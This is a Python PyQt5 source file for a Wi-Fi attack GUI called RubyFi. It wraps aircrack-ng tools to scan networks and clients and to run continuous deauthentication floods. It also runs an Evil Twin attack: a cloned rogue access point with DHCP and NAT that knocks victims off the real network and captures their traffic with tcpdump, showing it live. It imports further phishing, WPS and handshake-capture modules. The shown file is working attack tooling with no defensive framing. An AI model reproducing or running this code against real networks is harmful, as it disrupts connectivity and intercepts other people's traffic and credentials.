#!/usr/bin/env python3

"""FIXED: RubyFi PyQt5 GUI - Proper Deauth Integration with CLI Functions"""

import sys
import os
import re
import subprocess
import time
import tempfile
from datetime import datetime
from typing import Optional, List, Dict, Any
from PyQt5.QtWidgets import QFrame, QGridLayout
from gui.beacon_flood_dialog import BeaconFloodMixin
from gui.wifi_phishing_dialog import WiFiPhishingMixin

from gui.handshake_dialog import HandshakeCaptureThread, HandshakeModeDialog

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QLabel, QTextEdit, QProgressBar, QStatusBar,
    QTableWidget, QTableWidgetItem, QHeaderView, QSplitter,
    QDialog, QMessageBox
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QFont, QColor, QBrush

from gui.styles import DARK_THEME
from gui.interface_dialog import InterfaceDialog

# Import your CLI attack modules
from attacks.deauth import DeauthAttack
from attacks.handshake import HandshakeCapture
from attacks.evil_twin_deauth import EvilTwinDeauth
from attacks.wps_attack import WPSAttack
from utils.scan_networks import WiFiScanner
from gui.wps_dialog import WPSAttackThread, WPSModeDialog


class ScanThread(QThread):
    """Background thread for network scanning"""
    network_found = pyqtSignal(dict)
    scan_complete = pyqtSignal(int)
    progress_update = pyqtSignal(int, str)
    error_occurred = pyqtSignal(str)  # ADD THIS
    
    def __init__(self, interface):
        super().__init__()
        self.interface = interface
        self.running = True
    
    def run(self):
        """Run airodump-ng scan continuously"""
        try:
            self.progress_update.emit(10, "Starting airodump-ng...")
            temp_dir = tempfile.mkdtemp()
            output_file = os.path.join(temp_dir, "scan")
            
            cmd = [
                'airodump-ng',
                '--output-format', 'csv',
                '--write', output_file,
                '--band', 'abg',
                self.interface
            ]
            
            self.progress_update.emit(20, "Launching airodump-ng...")
            
            # Start airodump-ng process
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            self.progress_update.emit(30, "Scanning networks...")
            
            csv_file = f"{output_file}-01.csv"
            scan_count = 0
            found_networks = set()  # Track unique BSSIDs
            
            # CONTINUOUS SCANNING LOOP
            while self.running:
                scan_count += 1
                time.sleep(2)  # Parse every 2 seconds
                
                # Check if CSV file exists
                if os.path.exists(csv_file):
                    # Parse current networks
                    networks = self.parse_csv(csv_file)
                    
                    # Emit only NEW networks (not duplicates)
                    for network in networks:
                        bssid = network['bssid']
                        if bssid not in found_networks:
                            found_networks.add(bssid)
                            self.network_found.emit(network)
                    
                    # Update progress with current count
                    progress = min(30 + (scan_count * 2), 95)
                    self.progress_update.emit(
                        progress, 
                        f"Scanning... {len(found_networks)} networks found"
                    )
                else:
                    # CSV not created yet
                    self.progress_update.emit(
                        30, 
                        f"Waiting for networks... {scan_count}s"
                    )
            
            # User stopped scanning
            proc.terminate()
            proc.wait()
            
            # Final parse
            if os.path.exists(csv_file):
                networks = self.parse_csv(csv_file)
                for network in networks:
                    bssid = network['bssid']
                    if bssid not in found_networks:
                        found_networks.add(bssid)
                        self.network_found.emit(network)
            
            self.scan_complete.emit(len(found_networks))
            self.progress_update.emit(100, f"✅ Scan stopped - {len(found_networks)} networks")
            
            # Cleanup
            os.system(f"rm -rf {temp_dir}")
        
        except Exception as e:
            self.error_occurred.emit(f"Scan error: {str(e)}")  # Use signal instead
            self.progress_update.emit(100, f"Error: {e}")
            # self.log(f"❌ Scan error: {str(e)}")

    
    def parse_csv(self, csv_file):
        """Parse airodump-ng CSV output with deduplication and client counting"""
        networks = {}  # Use dict to prevent duplicates (BSSID as key)
        clients_per_ap = {}  # Track clients per BSSID
        
        try:
            if not os.path.exists(csv_file):
                return []
        
            if os.path.getsize(csv_file) < 10:  # File too small
                return []
            
            with open(csv_file, 'r', errors='ignore') as f:
                lines = f.readlines()
            
            if len(lines) < 5:
                return []
            
            ap_start = -1
            station_start = -1
            
            # Find section markers
            for i, line in enumerate(lines):
                if 'BSSID' in line and 'ESSID' in line and ap_start == -1:
                    ap_start = i + 1
                elif 'Station MAC' in line:
                    station_start = i + 1
                    break
            
            if ap_start == -1:
                return list(networks.values())
            
            # PARSE AP SECTION
            for line in lines[ap_start:station_start if station_start != -1 else len(lines)]:
                if not line.strip() or 'Station MAC' in line:
                    break
                
                parts = [p.strip() for p in line.split(',')]
                
                if len(parts) < 14:
                    continue
                
                bssid = parts[0]
                
                if not bssid or ':' not in bssid or len(bssid) != 17:
                    continue
                
                # Skip if already seen (DEDUPLICATION)
                if bssid in networks:
                    continue
                
                channel = parts[3].strip() or "0"
                power = parts[8].strip() or "-100"
                encryption = parts[5].strip()
                ssid = parts[13].strip() if len(parts) > 13 else ""
                
                is_5ghz = False
                try:
                    ch = int(channel)
                    is_5ghz = ch > 14
                except:
                    pass
                
                if bssid not in clients_per_ap:
                    clients_per_ap[bssid] = 0
                
                networks[bssid] = {
                    'ssid': ssid or "<Hidden SSID>",
                    'bssid': bssid,
                    'channel': channel,
                    'power': power,
                    'encryption': encryption,
                    'clients': '0',
                    'is_5ghz': is_5ghz,
                    'wps': 'WPS' in encryption
                }
            
            # PARSE STATION SECTION
            if station_start != -1:
                for line in lines[station_start:]:
                    if not line.strip():
                        continue
                    
                    parts = [p.strip() for p in line.split(',')]
                    
                    if len(parts) < 6:
                        continue
                    
                    client_bssid = parts[5].strip()
                    
                    if not client_bssid or client_bssid == '(not associated)' or ':' not in client_bssid:
                        continue
                    
                    if client_bssid in clients_per_ap:
                        clients_per_ap[client_bssid] += 1
            
            # UPDATE client counts
            for bssid, count in clients_per_ap.items():
                if bssid in networks:
                    networks[bssid]['clients'] = str(count)
            
            return list(networks.values())
        
        except Exception as e:
            print(f"Parse error: {e}")
            return []
    
    def stop(self):
        """Stop scanning"""
        self.running = False

class ClientScanThread(QThread):
    """Background thread for scanning connected clients"""
    client_found = pyqtSignal(dict)
    scan_complete = pyqtSignal(int)
    progress_update = pyqtSignal(str)
    
    def __init__(self, interface, bssid, channel):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.running = True
    
    def run(self):
        """Scan for clients"""
        try:
            # Set channel
            subprocess.run(
                ["iwconfig", self.interface, "channel", str(self.channel)],
                capture_output=True
            )
            
            self.progress_update.emit("🔍 Scanning for clients...")
            
            # Create temp directory
            temp_dir = tempfile.mkdtemp()
            output_file = os.path.join(temp_dir, "clients")
            
            # Start airodump-ng
            cmd = [
                'airodump-ng',
                '--bssid', self.bssid,
                '--channel', str(self.channel),
                '--output-format', 'csv',
                '--write', output_file,
                self.interface
            ]
            
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            csv_file = f"{output_file}-01.csv"
            clients_found = {}
            
            # Scan for 30 seconds or until stopped
            for i in range(30):
                if not self.running:
                    break
                
                time.sleep(1)
                self.progress_update.emit(f"⏳ Scanning... {i+1}s | Found: {len(clients_found)}")
                
                # Parse clients
                if os.path.exists(csv_file) and os.path.getsize(csv_file) > 50:
                    clients = self._parse_clients(csv_file)
                    for client in clients:
                        mac = client['Station MAC']
                        if mac not in clients_found:
                            clients_found[mac] = client
                            self.client_found.emit(client)
            
            proc.terminate()
            proc.wait()
            os.system(f"rm -rf {temp_dir}")
            self.scan_complete.emit(len(clients_found))
        
        except Exception as e:
            self.progress_update.emit(f"❌ Error: {str(e)}")
            self.scan_complete.emit(0)
    
    def _parse_clients(self, csv_file):
        """Parse clients from CSV"""
        clients = []
        try:
            with open(csv_file, 'r', errors='ignore') as f:
                lines = f.readlines()
            
            station_start = -1
            for i, line in enumerate(lines):
                if 'Station MAC' in line:
                    station_start = i + 1
                    break
            
            if station_start == -1:
                return []
            
            for line in lines[station_start:]:
                if not line.strip():
                    continue
                parts = [p.strip() for p in line.split(',')]
                if len(parts) < 6:
                    continue
                
                station_mac = parts[0].strip()
                bssid = parts[5].strip()
                
                if station_mac and ':' in station_mac and bssid == self.bssid:
                    clients.append({
                        'Station MAC': station_mac,
                        'Power': parts[3].strip() or 'N/A',
                        '# packets': parts[4].strip() or '0'
                    })
        except:
            pass
        return clients
    
    def stop(self):
        """Stop scanning"""
        self.running = False

class DeauthThread(QThread):
    """Background thread for deauth attack"""
    status_update = pyqtSignal(str)
    attack_complete = pyqtSignal(bool, str)
    
    def __init__(self, interface, bssid, ssid, channel, client_mac=None):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.client_mac = client_mac
        self.running = True
        self.process = None
    
    def run(self):
        """Run deauth attack in background with live stats"""
        try:
            # Set channel
            self.status_update.emit(f"🔧 Setting interface to channel {self.channel}...")
            subprocess.run(
                ["iwconfig", self.interface, "channel", str(self.channel)],
                capture_output=True
            )
            time.sleep(0.5)
            
            # Build command
            attack_type = "Directed" if self.client_mac else "Broadcast"
            self.status_update.emit(f"⚡ Starting {attack_type} deauth attack...")
            
            cmd = ["aireplay-ng", "--deauth", "0", "-a", self.bssid]
            if self.client_mac:
                cmd.extend(["-c", self.client_mac])
            cmd.append(self.interface)
            
            # Start attack
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1
            )
            
            self.status_update.emit("✅ Deauth attack running... (Click 'Stop Attack' to end)")
            
            # Read output line by line and emit stats
            packet_count = 0
            start_time = time.time()
            
            while self.running and self.process.poll() is None:
                try:
                    line = self.process.stdout.readline()
                    if not line:
                        break
                    
                    # Parse aireplay-ng output for ACKs (successful packets)
                    if "ACKs" in line or "acks" in line.lower():
                        # Extract numbers from line
                        import re
                        numbers = re.findall(r'\d+', line)
                        if numbers:
                            packet_count = int(numbers[0])
                            elapsed = int(time.time() - start_time)
                            rate = packet_count / elapsed if elapsed > 0 else 0
                            
                            # Emit formatted stats
                            self.status_update.emit(
                                f"⚡ Packets: {packet_count} | Time: {elapsed}s | Rate: {rate:.1f}/s"
                            )
                except:
                    pass
            
            # Stop process
            if self.process and self.process.poll() is None:
                self.process.terminate()
                self.process.wait(timeout=2)
            
            elapsed = int(time.time() - start_time)
            self.attack_complete.emit(True, f"Attack stopped - {packet_count} packets sent in {elapsed}s")
        
        except Exception as e:
            self.attack_complete.emit(False, str(e))
        finally:
            subprocess.run("pkill aireplay-ng", shell=True, stderr=subprocess.DEVNULL)

    
    def stop(self):
        """Stop the attack"""
        self.running = False
        if self.process and self.process.poll() is None:
            self.process.terminate()


class EvilTwinThread(QThread):
    """Background thread for Evil Twin attack"""
    status_update = pyqtSignal(str)
    client_connected = pyqtSignal(str, str)  # (mac, ip)
    attack_complete = pyqtSignal(bool, str)
    
    def __init__(self, interface, bssid, ssid, channel):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.running = True
        self.processes = []
        self.rogue_ap_proc = None
        self.deauth_proc = None
        self.dnsmasq_proc = None
    
    def run(self):
        """Run Evil Twin attack"""
        try:
            # Step 0: Cleanup old data
            self.status_update.emit("🔧 Step 0: Cleaning up old data...")
            self.cleanup_old_leases()
            
            # Step 1: Start airbase-ng (Rogue AP)
            self.status_update.emit("🔧 Step 1: Starting Rogue AP...")
            if not self.start_rogue_ap():
                self.attack_complete.emit(False, "Failed to start Rogue AP")
                return
            
            time.sleep(5)
            
            # Step 2: Configure network
            self.status_update.emit("🔧 Step 2: Configuring network...")
            self.configure_network()
            
            # Step 3: Enable internet sharing
            self.status_update.emit("🔧 Step 3: Enabling internet sharing...")
            self.enable_internet_sharing()
            
            # Step 4: Start deauth
            self.status_update.emit("🔧 Step 4: Starting deauth attack...")
            self.start_deauth()
            
            self.status_update.emit("✅ Evil Twin attack is ACTIVE!")
            self.status_update.emit("📡 Rogue AP broadcasting...")
            self.status_update.emit(f"📶 SSID: {self.ssid} (OPEN)")
            self.status_update.emit("⚡ Deauth packets sending...")
            self.status_update.emit("🎯 Waiting for clients to connect...")
            
            # Wait 2 seconds before monitoring to avoid reading stale data
            time.sleep(2)
            
            # Monitor for clients
            self.monitor_clients()
            
        except Exception as e:
            self.attack_complete.emit(False, str(e))
        finally:
            self.cleanup()

    
    def cleanup_old_leases(self):
        """Clean up old DHCP leases and ARP cache"""
        try:
            # Remove old DHCP lease file
            dhcp_lease_file = "/var/lib/misc/dnsmasq.leases"
            if os.path.exists(dhcp_lease_file):
                os.remove(dhcp_lease_file)
                self.status_update.emit("🧹 Cleared old DHCP leases")
            
            # Flush ARP cache for at0
            subprocess.run(["ip", "neigh", "flush", "dev", "at0"],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL)
            
            self.status_update.emit("🧹 Cleared ARP cache")
            
        except Exception as e:
            self.status_update.emit(f"⚠️ Cleanup warning: {str(e)}")

    
    def start_rogue_ap(self) -> bool:
        """Start airbase-ng (exactly like CLI does it)"""
        try:
            self.status_update.emit("🔧 Preparing interface...")
            
            # Pre-clean: stop services that interfere
            subprocess.run(["rfkill", "unblock", "all"], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["airmon-ng", "check", "kill"], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)
            
            # Bring interface up
            subprocess.run(["ip", "link", "set", self.interface, "up"], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.status_update.emit(f"✓ Interface {self.interface} is UP")
            
            # Set channel
            subprocess.run(["iw", "dev", self.interface, "set", "channel", str(self.channel)],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.status_update.emit(f"✓ Channel set to {self.channel}")
            time.sleep(1)
            
            # Remove old at0 if exists
            subprocess.run(["ip", "link", "set", "at0", "down"], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "link", "delete", "at0"], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Start airbase-ng (EXACTLY like CLI)
            self.status_update.emit(f"🚀 Launching Rogue AP: {self.ssid}...")
            
            cmd = [
                "airbase-ng",
                "-e", self.ssid,
                "-c", str(self.channel),
                self.interface
            ]
            
            self.rogue_ap_proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,  # NOT capture_output=True!
                stderr=subprocess.PIPE,
                text=True
            )
            self.processes.append(self.rogue_ap_proc)
            
            # Wait for at0 interface (up to 8 seconds)
            self.status_update.emit("⏳ Waiting for 'at0' interface...")
            
            for i in range(16):
                time.sleep(0.5)
                
                # Check if at0 exists
                chk = subprocess.run(["ip", "link", "show", "at0"], 
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                if chk.returncode == 0:
                    self.status_update.emit("✅ Rogue AP started successfully!")
                    self.status_update.emit(f"📡 Broadcasting SSID: {self.ssid}")
                    self.status_update.emit(f"📶 Interface: at0 created")
                    return True
                
                # Check if airbase died
                if self.rogue_ap_proc.poll() is not None:
                    # Process died, get error
                    try:
                        stderr_output = self.rogue_ap_proc.stderr.read()
                        self.status_update.emit(f"❌ airbase-ng failed: {stderr_output}")
                    except:
                        self.status_update.emit("❌ airbase-ng failed to start")
                    return False
            
            # Timeout
            self.status_update.emit("❌ Timeout: 'at0' interface not created after 8s")
            self.status_update.emit("💡 Tip: Run 'sudo airmon-ng check kill' manually")
            return False
            
        except Exception as e:
            self.status_update.emit(f"❌ Exception in start_rogue_ap: {str(e)}")
            import traceback
            self.status_update.emit(f"Traceback: {traceback.format_exc()}")
            return False


    
    def configure_network(self):
        """Configure at0 interface and start DHCP"""
        try:
            # Ensure at0 exists
            chk = subprocess.run(["ip", "link", "show", "at0"], 
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if chk.returncode != 0:
                self.status_update.emit("❌ Interface 'at0' not found!")
                return
            
            # Bring up and assign IP
            subprocess.run(["ip", "link", "set", "at0", "up"], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "addr", "flush", "dev", "at0"], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "addr", "add", "192.168.100.1/24", "dev", "at0"], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            self.status_update.emit("✅ Network configured: 192.168.100.1/24")
            
            # Stop old dnsmasq
            subprocess.run(["pkill", "dnsmasq"], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)
            
            # Start dnsmasq DHCP server
            cmd = [
                "dnsmasq",
                "-i", "at0",
                "-I", "lo",
                "--dhcp-range=192.168.100.10,192.168.100.250,12h",
                "--dhcp-option=3,192.168.100.1",
                "--dhcp-option=6,8.8.8.8",
                "-d"
            ]
            
            self.dnsmasq_proc = subprocess.Popen(
                cmd, 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.DEVNULL
            )
            self.processes.append(self.dnsmasq_proc)
            
            self.status_update.emit("✅ DHCP server started (192.168.100.10-250)")
            
        except Exception as e:
            self.status_update.emit(f"⚠️ Network config error: {str(e)}")

    
    def start_deauth(self):
        """Start deauth attack"""
        try:
            cmd = f"aireplay-ng --deauth 0 -a {self.bssid} {self.interface}"
            self.deauth_proc = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.processes.append(self.deauth_proc)
            self.status_update.emit("✅ Deauth attack started")
        except Exception as e:
            self.status_update.emit(f"⚠️ Deauth error: {e}")
    
    def monitor_clients(self):
        """Monitor for connected clients - ONLY NEW CONNECTIONS"""
        seen_clients = set()
        monitor_start_time = time.time()  # Record when monitoring started
        
        self.status_update.emit(f"🔍 Monitoring started at {time.strftime('%H:%M:%S')}")
        
        while self.running:
            try:
                # Method 1: Check dnsmasq DHCP leases
                dhcp_lease_file = "/var/lib/misc/dnsmasq.leases"
                if os.path.exists(dhcp_lease_file):
                    try:
                        with open(dhcp_lease_file, 'r') as f:
                            for line in f:
                                if not line.strip():
                                    continue
                                
                                parts = line.strip().split()
                                if len(parts) >= 3:
                                    lease_timestamp = int(parts[0])  # First field is timestamp
                                    mac = parts[1].upper()
                                    ip = parts[2]
                                    
                                    # Skip gateway
                                    if ip == '192.168.100.1':
                                        continue
                                    
                                    # CRITICAL: Only accept leases AFTER monitoring started
                                    if lease_timestamp < monitor_start_time:
                                        continue  # Skip old leases
                                    
                                    client_id = f"{mac}:{ip}"
                                    if client_id not in seen_clients:
                                        seen_clients.add(client_id)
                                        self.client_connected.emit(mac, ip)
                    except Exception as e:
                        pass
                
                # Method 2: Fallback to ARP (but less reliable for timestamps)
                # Only use if DHCP lease file doesn't exist
                if not os.path.exists(dhcp_lease_file):
                    result = subprocess.run(["arp", "-an"], 
                                        capture_output=True, 
                                        text=True, 
                                        timeout=2)
                    if result.returncode == 0:
                        for line in result.stdout.split('\n'):
                            if '192.168.100.' in line and 'at0' in line:
                                try:
                                    parts = line.split()
                                    if len(parts) >= 4:
                                        ip = parts[1].strip('()')
                                        mac = parts[3].upper()
                                        
                                        # Skip gateway and incomplete
                                        if ip == '192.168.100.1' or '<incomplete>' in mac:
                                            continue
                                        
                                        client_id = f"{mac}:{ip}"
                                        if client_id not in seen_clients:
                                            seen_clients.add(client_id)
                                            self.client_connected.emit(mac, ip)
                                except:
                                    pass
                
                time.sleep(3)  # Check every 3 seconds
                
            except Exception as e:
                time.sleep(3)



    
    def stop(self):
        """Stop the attack"""
        self.running = False
    
    def cleanup(self):
        """Clean up processes and restore settings"""
        # Clean up DHCP leases
        try:
            dhcp_lease_file = "/var/lib/misc/dnsmasq.leases"
            if os.path.exists(dhcp_lease_file):
                os.remove(dhcp_lease_file)
        except:
            pass
        
        # Flush ARP for at0
        try:
            subprocess.run(["ip", "neigh", "flush", "dev", "at0"],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL)
        except:
            pass
        
        # Disable IP forwarding
        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iptables", "-t", "nat", "-F"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iptables", "-F"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.status_update.emit("✅ IP forwarding disabled")
        except:
            pass
        
        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except:
                try:
                    proc.kill()
                except:
                    pass
        
        subprocess.run("pkill aireplay-ng", shell=True, capture_output=True)
        subprocess.run("pkill airbase-ng", shell=True, capture_output=True)
        subprocess.run("pkill dnsmasq", shell=True, capture_output=True)
        subprocess.run("ip link set at0 down 2>/dev/null", shell=True, capture_output=True)
        
        self.attack_complete.emit(True, "Evil Twin attack stopped")


    def enable_internet_sharing(self):
        """Enable internet sharing so clients get real internet (like CLI)"""
        try:
            self.status_update.emit("🌐 Enabling internet sharing...")
            
            # Find internet interface
            internet_iface = self.find_internet_interface()
            if not internet_iface:
                self.status_update.emit("⚠️ No internet interface found")
                self.status_update.emit("⚠️ Clients will connect but have no internet")
                return
            
            self.status_update.emit(f"🌐 Internet interface: {internet_iface}")
            
            # Enable IP forwarding
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.status_update.emit("✅ IP forwarding enabled")
            
            # Flush old iptables rules
            subprocess.run(["iptables", "-t", "nat", "-F"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iptables", "-F"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Setup NAT (Network Address Translation)
            subprocess.run([
                "iptables", "-t", "nat", "-A", "POSTROUTING",
                "-o", internet_iface, "-j", "MASQUERADE"
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Allow forwarding from at0 to internet
            subprocess.run([
                "iptables", "-A", "FORWARD",
                "-i", "at0", "-o", internet_iface,
                "-j", "ACCEPT"
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Allow return traffic
            subprocess.run([
                "iptables", "-A", "FORWARD",
                "-i", internet_iface, "-o", "at0",
                "-m", "state", "--state", "RELATED,ESTABLISHED",
                "-j", "ACCEPT"
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            self.status_update.emit(f"✅ NAT configured (at0 → {internet_iface})")
            self.status_update.emit("✅ Clients will have internet access!")
            
            # Start traffic monitoring
            self.start_traffic_monitoring()
            
        except Exception as e:
            self.status_update.emit(f"⚠️ Internet sharing error: {str(e)}")

    def find_internet_interface(self):
        """Find interface with internet connection"""
        try:
            # Get default route
            result = subprocess.run(
                ["ip", "route", "show", "default"],
                capture_output=True,
                text=True
            )
            if result.returncode == 0 and result.stdout:
                # Parse: "default via X.X.X.X dev eth0"
                parts = result.stdout.split()
                if "dev" in parts:
                    dev_index = parts.index("dev")
                    if dev_index + 1 < len(parts):
                        return parts[dev_index + 1]
            
            # Fallback: check common interfaces
            for iface in ["eth0", "enp0s3", "ens33", "wlan1", "wlan2"]:
                result = subprocess.run(
                    ["ip", "addr", "show", iface],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                if result.returncode == 0:
                    return iface
        except:
            pass
        
        return None

    def start_traffic_monitoring(self):
        """Start monitoring traffic and show in new terminal (like CLI)"""
        try:
            self.status_update.emit("📊 Starting traffic monitoring...")
            
            # Create capture directory
            capture_dir = "/tmp/evil_twin_captures"
            os.makedirs(capture_dir, exist_ok=True)
            
            # Start tcpdump to capture all traffic
            capture_file = f"{capture_dir}/capture_{int(time.time())}.pcap"
            tcpdump_cmd = [
                "tcpdump",
                "-i", "at0",
                "-w", capture_file,
                "-U"  # Unbuffered
            ]
            
            tcpdump_proc = subprocess.Popen(
                tcpdump_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.processes.append(tcpdump_proc)
            
            self.status_update.emit(f"✅ Traffic capture: {capture_file}")
            
            # Open live traffic monitor in new terminal
            monitor_cmd_string = "tcpdump -i at0 -n -A 'port 80 or port 443 or port 53'"
            
            # Try multiple terminal emulators
            terminal_commands = [
                ["gnome-terminal", "--", "bash", "-c", 
                f"{monitor_cmd_string}; echo 'Press Enter to close'; read"],
                ["xfce4-terminal", "--hold", "-e", 
                f"bash -c '{monitor_cmd_string}'"],
                ["konsole", "-e", "bash", "-c", 
                f"{monitor_cmd_string}; echo 'Press Enter to close'; read"],
                ["xterm", "-hold", "-e", monitor_cmd_string],
            ]
            
            terminal_opened = False
            for cmd in terminal_commands:
                try:
                    subprocess.Popen(cmd, 
                                stdout=subprocess.DEVNULL, 
                                stderr=subprocess.DEVNULL)
                    self.status_update.emit("✅ Traffic monitor window opened!")
                    self.status_update.emit("📡 Watch HTTP/HTTPS/DNS traffic live")
                    terminal_opened = True
                    break
                except:
                    continue
            
            if not terminal_opened:
                self.status_update.emit("⚠️ No terminal emulator found")
                self.status_update.emit("💡 Manual: sudo tcpdump -i at0 -n -A 'port 80 or port 443'")
            
        except Exception as e:
            self.status_update.emit(f"⚠️ Traffic monitoring error: {str(e)}")


class ClientSelectionDialog(QDialog):
    """Dialog to select a client for directed deauth"""
    
    def __init__(self, bssid: str, ssid: str, channel: str, interface: str, parent=None):  # ADD clients parameter
        super().__init__(parent)
        self.setWindowTitle("⚡ Select Client for Directed Deauth")
        self.setModal(True)
        self.setMinimumSize(600, 400)
        self.selected_client = None
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.interface = interface
        # self.clients = clients or []  # Store the clients list
        self.clients = []
        self.scan_thread = None

        self.init_ui()
        self.start_scanning()  # Start scanning when dialog opens

    def init_ui(self):
        layout = QVBoxLayout(self)
        
        # Header
        header = QLabel("⚡ CONNECTED CLIENTS")
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        header.setStyleSheet("font-size: 16px; font-weight: bold; color: #ff006e; margin: 10px;")
        layout.addWidget(header)
        
        # Info label
        # Status label (updates during scan)
        self.status_label = QLabel("🔍 Scanning for clients...")
        self.status_label.setStyleSheet("color: #00ff88; margin: 10px; font-weight: bold;")
        layout.addWidget(self.status_label)

        # Client table instead of combo box
        self.client_table = QTableWidget()
        self.client_table.setColumnCount(3)
        self.client_table.setHorizontalHeaderLabels(["MAC Address", "Power (dBm)", "Packets"])

        # Set column widths
        header = self.client_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)  # MAC stretches
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)  # Power fixed
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)  # Packets fixed

        self.client_table.verticalHeader().setVisible(False)
        self.client_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.client_table.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)

        # Style the table
        self.client_table.setStyleSheet("""
            QTableWidget {
                background: #0d1117;
                border: 1px solid #30363d;
                color: #c9d1d9;
                gridline-color: #30363d;
            }
            QHeaderView::section {
                background: #161b22;
                color: #00ff88;
                border: 1px solid #30363d;
                padding: 8px;
                font-weight: bold;
            }
            QTableWidget::item {
                padding: 5px;
            }
            QTableWidget::item:selected {
                background: #1f6feb;
            }
        """)

        layout.addWidget(self.client_table)


        # self.client_combo.setStyleSheet("""
        #     QComboBox {
        #         background: #21262d;
        #         border: 2px solid #00ff88;
        #         color: #00ff88;
        #         padding: 8px;
        #         border-radius: 6px;
        #         font-size: 12px;
        #     }
        # """)
        
        # # Populate with pre-scanned clients (NOT scanning again)
        # if self.clients:
        #     for client in self.clients:
        #         mac = client.get('Station MAC', 'Unknown')
        #         power = client.get('Power', 'NA')
        #         packets = client.get('# packets', '0')
        #         display = f"{mac} | Power: {power} dBm | Packets: {packets}"
        #         self.client_combo.addItem(display, mac)
        # else:
        #     self.client_combo.addItem("No clients - Broadcast mode", None)
        
        # layout.addWidget(self.client_combo)
        
        # Buttons
        btn_layout = QHBoxLayout()
        
        # Stop Scan button
        self.stop_scan_btn = QPushButton("⏹️ Stop Scanning")
        self.stop_scan_btn.setStyleSheet("""
            QPushButton {
                background: #21262d;
                border: 2px solid #ffbe0b;
                color: #ffbe0b;
                padding: 10px;
                border-radius: 6px;
                font-weight: bold;
            }
            QPushButton:hover {
                background: #ffbe0b;
                color: #0d1117;
            }
        """)
        self.stop_scan_btn.clicked.connect(self.stop_scanning)
        btn_layout.addWidget(self.stop_scan_btn)

        select_btn = QPushButton("✓ Select")
        select_btn.setStyleSheet("""
            QPushButton {
                background: #21262d;
                border: 2px solid #00ff88;
                color: #00ff88;
                padding: 10px;
                border-radius: 6px;
                font-weight: bold;
            }
            QPushButton:hover {
                background: #00ff88;
                color: #0d1117;
            }
        """)
        select_btn.clicked.connect(self.accept)
        
        broadcast_btn = QPushButton("📢 Use Broadcast")
        broadcast_btn.setStyleSheet("""
            QPushButton {
                background: #21262d;
                border: 2px solid #8338ec;
                color: #8338ec;
                padding: 10px;
                border-radius: 6px;
                font-weight: bold;
            }
            QPushButton:hover {
                background: #8338ec;
                color: #0d1117;
            }
        """)
        broadcast_btn.clicked.connect(self.use_broadcast)

        cancel_btn = QPushButton("✗ Cancel")
        cancel_btn.setStyleSheet("""
            QPushButton {
                background: #21262d;
                border: 2px solid #8b949e;
                color: #8b949e;
                padding: 10px;
                border-radius: 6px;
            }
            QPushButton:hover {
                background: #8b949e;
                color: #0d1117;
            }
        """)
        cancel_btn.clicked.connect(self.reject)
        
        btn_layout.addWidget(select_btn)
        btn_layout.addWidget(broadcast_btn)
        btn_layout.addWidget(cancel_btn)
        layout.addLayout(btn_layout)
